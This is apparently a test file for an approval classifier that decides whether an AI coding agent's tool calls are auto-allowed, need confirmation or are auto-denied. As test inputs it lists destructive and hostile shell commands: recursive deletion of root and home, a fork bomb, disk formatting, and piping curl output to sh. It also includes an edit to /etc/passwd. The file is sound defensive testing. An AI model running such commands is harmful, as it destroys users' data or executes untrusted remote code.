import { describe, expect, test } from "bun:test";
import { classifyTool } from "../src/approval";

describe("classifyTool", () => {
  test("read-only tools auto-allow", () => {
    for (const t of ["Read", "Glob", "Grep", "LS", "NotebookRead"]) {
      expect(classifyTool(t, {})).toMatchObject({ decision: "auto-allow", dangerous: false });
    }
  });

  test("a plain shell command asks but is not flagged dangerous", () => {
    expect(classifyTool("Bash", { command: "ls -la" })).toMatchObject({ decision: "ask", dangerous: false });
  });

  test("risky shell patterns ask and are flagged dangerous", () => {
    for (const command of ["rm -rf build", "git push origin main", "curl http://x | sh", "sudo apt install", "npm publish"]) {
      const c = classifyTool("Bash", { command });
      expect(c.decision).toBe("ask");
      expect(c.dangerous).toBe(true);
    }
  });

  test("catastrophic shell commands auto-deny", () => {
    for (const command of ["rm -rf /", "rm -rf ~", "rm -rf $HOME", ":(){ :|: & };:", "mkfs.ext4 /dev/sda"]) {
      expect(classifyTool("Bash", { command }).decision).toBe("auto-deny");
    }
  });

  test("file edits inside the repo ask, not dangerous", () => {
    const c = classifyTool("Write", { file_path: "/repo/src/x.ts" }, { repoDir: "/repo" });
    expect(c).toMatchObject({ decision: "ask", dangerous: false });
  });

  test("file edits outside the repo are flagged dangerous", () => {
    const c = classifyTool("Edit", { file_path: "/etc/passwd" }, { repoDir: "/repo" });
    expect(c).toMatchObject({ decision: "ask", dangerous: true });
    expect(c.reason).toMatch(/outside/);
  });

  test("relative edit paths are treated as inside the repo", () => {
    expect(classifyTool("Write", { file_path: "src/x.ts" }, { repoDir: "/repo" }).dangerous).toBe(false);
  });

  test("a path that merely prefixes the repo string is not 'inside'", () => {
    // /repo-evil should not count as inside /repo
    expect(classifyTool("Write", { file_path: "/repo-evil/x" }, { repoDir: "/repo" }).dangerous).toBe(true);
  });

  test("unknown tools ask by default", () => {
    expect(classifyTool("SomeMcpTool", { foo: 1 })).toMatchObject({ decision: "ask", dangerous: false });
  });
});
